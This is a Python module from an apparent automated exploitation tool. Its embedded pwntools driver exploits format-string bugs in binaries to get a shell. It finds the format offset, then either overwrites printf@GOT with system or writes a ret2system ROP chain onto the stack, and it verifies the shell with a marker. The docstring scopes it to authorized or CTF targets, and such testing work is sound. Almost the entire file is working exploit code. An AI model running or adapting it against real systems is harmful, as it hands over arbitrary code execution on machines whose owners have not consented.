"""Format-string exploitation, verified by getting a shell in the sandbox.

For a binary that uses user input as a printf format inside a loop, this finds the
format-argument offset, overwrites printf@GOT with system (ASLR disabled so system is
fixed), and then sends '/bin/sh' so the next printf(buf) becomes system('/bin/sh').
Confirms a real shell. For AUTHORIZED / CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, os, time
from pwn import *
name = sys.argv[1]
elf = ELF(name, checksec=False); context.binary = elf; context.log_level = "error"
prompt = sys.argv[2].encode() if len(sys.argv) > 2 else b"say: "
if "printf" not in elf.got:
    print("NOT_APPLICABLE (no printf@GOT)"); sys.exit(1)
MARK = b"BINORACLE_FMT_PWNED"
bn = os.path.basename(name)

def _page_writable(pid, addr):
    try:
        for line in open("/proc/%d/maps" % pid):
            lo, hi = (int(x, 16) for x in line.split()[0].split("-"))
            if lo <= addr < hi:
                return "w" in line.split()[1]
    except Exception:
        pass
    return False

# find the format-arg offset with a marker + %p chain. Arch-aware: on x86-64 a slot the marker
# lands in prints as 0x4141414141414141 (8 bytes), on x86-32 as 0x41414141 (4 bytes). The probe is
# timing-sensitive (a single recvuntil can miss the tail under load), so retry it a few times -- a
# fresh process each try -- gathering the full line with recvrepeat before parsing.
_marks = (b"0x4141414141414141",) if elf.bits == 64 else (b"0x41414141",)
io = None
offset = None
for _attempt in range(4):
    try:
        if io is not None:
            io.close()
    except Exception:
        pass
    io = process([elf.path], aslr=False)
    try:
        io.recvuntil(prompt, timeout=2)
    except Exception:
        pass
    io.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 41)))
    resp = b""
    try:
        resp = io.recvuntil(prompt, timeout=3)
    except Exception:
        pass
    resp += io.recvrepeat(0.4)                      # drain any tail the prompt-sync missed
    for i, tok in enumerate(resp.split(b".")[1:], 1):
        if tok.strip() in _marks:
            offset = i; break
    if offset is not None:
        break
if offset is None:
    print("NO_OFFSET"); sys.exit(1)
# reopen a FRESH, prompt-synced process for the exploitation phase: the probe above consumed
# rounds / may have desynced the recv stream, which otherwise breaks the first write attempt.
try:
    io.close()
except Exception:
    pass
io = process([elf.path], aslr=False)
try:
    io.recvuntil(prompt, timeout=2)
except Exception:
    pass
libc = io.libc; system = libc.symbols["system"]
pie_base = 0
if elf.pie:
    for path, base in (io.libs() or {}).items():       # 1) pwntools' own mapping
        if os.path.basename(path) == bn:
            pie_base = base; break
    if not pie_base:                                     # 2) /proc/<pid>/maps (lowest mapping)
        try:
            addrs = [int(l.split("-")[0], 16) for l in open("/proc/%d/maps" % io.pid) if bn in l]
            if addrs:
                pie_base = min(addrs) & ~0xfff
        except Exception:
            pass
    if not pie_base:
        pie_base = 0x555555554000                        # 3) standard ASLR-off PIE base
printf_got = elf.got["printf"] + pie_base

if _page_writable(io.pid, printf_got):
    # Partial RELRO: printf@GOT is writable -> overwrite it with system so printf(buf)->system(buf).
    for wsz in ("short", "byte"):
        try:
            payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
            io.sendline(payload)
            io.recvuntil(prompt, timeout=3)
            io.sendline(b"/bin/sh")
            io.sendline(b"echo " + MARK)
            out = io.recvrepeat(2)
            if MARK in out:
                print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
                sys.exit(0)
        except Exception:
            pass
        # reopen for next attempt
        try: io.close()
        except Exception: pass
        io = process([elf.path], aslr=False)
        try: io.recvuntil(prompt, timeout=2)
        except Exception: pass
    print("NOT_VERIFIED offset=%d" % offset)
    sys.exit(1)

# Full RELRO fallback below is x86-64-specific (u64 / pop rdi / 16B movaps alignment). On a 32-bit
# Full-RELRO target it cannot apply, so degrade honestly rather than build a wrong chain.
if elf.bits != 64:
    print("NOT_VERIFIED offset=%d (Full-RELRO fallback es x86-64; 32-bit Full-RELRO no soportado)" % offset)
    sys.exit(1)

# Full RELRO: printf@GOT is read-only (a %n write to it SIGSEGVs), so the GOT-overwrite technique
# cannot work. The stack is writable and ASLR is off, so instead hijack the return address of the
# current printf(buf) call: when this printf returns it runs a ret2system chain -> system("/bin/sh").
# stdin stays open (no EOF needed), so the spawned shell reads our next line.
binsh = next(libc.search(b"/bin/sh"))
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address
# locate our input buffer and printf's saved return address on the stack via /proc/<pid>/mem
MARKER = b"BORCfmtZ"
io.sendline(MARKER)
io.recvuntil(prompt, timeout=3)
pie_lo = pie_hi = stack_lo = stack_hi = None
for line in open("/proc/%d/maps" % io.pid):
    f = line.split()
    lo, hi = (int(x, 16) for x in f[0].split("-"))
    if bn in line and "x" in f[1]:
        pie_lo, pie_hi = lo, hi
    if "[stack]" in line:
        stack_lo, stack_hi = lo, hi
if pie_lo is None or stack_lo is None:
    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
with open("/proc/%d/mem" % io.pid, "rb", 0) as mem:
    mem.seek(stack_lo); data = mem.read(stack_hi - stack_lo)
buf_off = data.find(MARKER)
if buf_off < 0:
    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
buf_addr = stack_lo + buf_off
printf_ret = None                                        # first qword below buf pointing into PIE code
for a in range(buf_addr - 8, stack_lo, -8):
    v = u64(data[a - stack_lo:a - stack_lo + 8])
    if pie_lo <= v < pie_hi:
        printf_ret = a; break
if printf_ret is None:
    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
chain = [ret, pop_rdi, binsh, system]                    # leading ret aligns the stack for system (movaps)
writes = {printf_ret + i * 8: v for i, v in enumerate(chain)}
try:
    payload = fmtstr_payload(offset, writes, write_size="short")
    io.sendline(payload)                                 # printf returns into the chain -> shell
    time.sleep(0.3)
    io.sendline(b"echo " + MARK)
    out = io.recvrepeat(2)
    if MARK in out:
        print("VERIFIED offset=%d system=%#x printf_ret=%#x (ret2system, full RELRO)"
              % (offset, system, printf_ret))
        sys.exit(0)
except Exception:
    pass
print("NOT_VERIFIED offset=%d" % offset)
sys.exit(1)
'''


def autofmt(binary: str, run: bool = True, prompt: str = "say: ") -> dict:
    res = run_driver(binary, _DRIVER, ".binoracle_fmt.py", args=[prompt])
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"format-string -> printf@GOT=system: shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"format-string: no verificado ({eng}) (no aplica printf(user) en bucle o timing)")
    return res


def render_fmt(r: dict) -> str:
    out = ["## Auto format-string (GOT overwrite -> shell, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- {r['detail']}")
    out.append(f"- {r.get('note','')}")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
